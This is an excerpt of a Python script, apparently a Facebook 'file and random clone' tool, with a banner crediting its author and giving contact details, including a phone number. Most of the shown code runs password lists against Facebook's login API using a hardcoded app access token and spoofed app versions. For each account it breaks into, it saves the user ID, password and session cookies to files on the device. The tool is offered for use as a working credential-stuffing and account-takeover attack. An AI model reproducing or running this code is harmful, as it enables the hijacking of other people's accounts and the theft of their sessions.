...
ㅤㅤㅤㅤ.d8888.  .d8b.  .88b  d88. d888888b d8888b. 
ㅤㅤㅤㅤ88'  YP d8' `8b 88'YbdP`88   `88'   88  `8D 
ㅤㅤㅤㅤ`8bo.   88ooo88 88  88  88    88    88oobY' 
ㅤㅤㅤㅤ  `Y8b. 88~~~88 88  88  88    88    88`8b   
ㅤㅤㅤㅤdb   8D 88   88 88  88  88   .88.   88 `88. 
ㅤㅤㅤㅤ`8888Y' YP   YP YP  YP  YP Y888888P 88   FS 
\033[34;1m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃\033[1;93m [✓] AUTHOR    \033[1;91m: \033[1;93m𝗙𝗢𝗬𝗦𝗔𝗟 𝗦𝗔𝗠𝗜𝗥               ┃
 ┃\033[1;35m [✓] TOOL      \033[1;91m: \033[1;35mFILE & RANDOM CLONE        ┃
 ┃\033[1;91m [✓] STATUS    \033[1;91m: \033[1;91m𝙁𝙧𝙚𝙚                       ┃
 ┃\033[30;1m [✓] SYSTEM    \033[1;91m: \033[30;1mDATA & WIFI                ┃
 ┃\33[1;92m [✓] GITHUB    \033[1;91m: \33[1;92mSamir-04-CYBER             ┃
 ┃\033[1;36m [✓] FACEBOOK  \033[1;91m: \033[1;36m𝗙 𝗦 𝗙𝗢𝗬𝗦𝗔𝗟 𝗦𝗔𝗠𝗜𝗥           ┃
 ┃\033[1;34m [✓] WHATSAPP  \033[1;91m: \033[1;34m+8801887531893             ┃
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
\033[34;1m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
...
def menu():
        try:
                        clear()
                        print(f'{B}❲{A}1{B}❳{G} 𝗙𝗜𝗟𝗘  𝗖𝗟𝗢𝗡𝗜𝗡𝗚 \n{B}❲{A}2{B}❳{G} 𝗥𝗔𝗡𝗗𝗢𝗠 𝗖𝗟𝗢𝗡𝗜𝗡𝗚\n{B}❲{A}3{B}❳{G} 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗧𝗢𝗢𝗟 𝗢𝗪𝗡𝗘𝗥\n{B}❲{A}0{B}❳{G} 𝗘𝗫𝗜𝗧 𝗧𝗢𝗢𝗟')
                        linex()
                        xd=input(f'{B}❲{A}?{B}❳{G} 𝐂𝐇𝐎𝐈𝐂𝐄 : ')
                        if xd in ['1','01']:
...
def api1(ids,names,passlist):
        try:
                ...
                sys.stdout.write(f'\r\r{B}❲{G}SAMIR-XD{B}❳{G} %s {B}|{G} OK{B}|{G}CP{G} %s{B}|{G}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print(f'\r\r{B}❲{G}SAMIR-OK{B}❳{G} '+ids+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{B}❲{G}COOKIE{B}❳>{A} "+coki)
                                        open('/sdcard/SAMIR-FILE-M1-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{B}❲{Y}SAMIR-CP{B}❳{Y} '+ids+' | '+pas+'\033[1;97m')
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{B}❲{G}COOKIE{B}❳>{A} "+coki)
                                        open('/sdcard/SAMIR-FILE-M2-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
...
def rndm1(uid,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r{B}❲{G}SAMIR-M1{B}❳{G} %s {B}|{G} OK{B}|{G}CP{G} %s{B}|{G}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{B}❲{G}SAMIR-OK{B}❳{G} '+uid+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{B}❲{G}COOKIE{B}❳>{A} "+coki)
                                        open('/sdcard/SAMIR-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(uid)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{B}❲{Y}SAMIR-CP{B}❳{Y} '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/SAMIR-CP.txt','a').write(uid+'|'+pas+'\n')
                                                cps.append(uid)
                                                break
                                        else:
                                                break
...
def rndm2(uid,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r{B}❲{G}SAMIR-M2{B}❳{G} %s {B}|{G} OK{B}|{G}CP{G} %s{B}|{G}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
...
def rndm3(uid,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r{B}❲{G}SAMIR-M3{B}❳{G} %s {B}|{G} OK{B}|{G}CP{G} %s{B}|{G}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
